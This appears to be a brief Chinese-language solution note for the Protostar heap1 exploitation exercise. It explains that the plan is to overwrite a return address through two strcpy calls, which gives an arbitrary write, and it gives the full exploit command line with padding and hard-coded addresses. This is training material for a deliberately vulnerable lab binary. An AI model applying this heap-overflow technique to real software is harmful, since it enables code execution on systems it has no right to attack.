1.覆盖返回地址
2.两次覆盖。第二个strcpy的2个参数均为我们控制。
任意地址写任意数据


/opt/protostar/bin/heap1 $(python -c "print 'A'*0x14+'\x8c\xf7\xff\xbf'") $(python -c "print '\x94\x84\x04\x08'*5")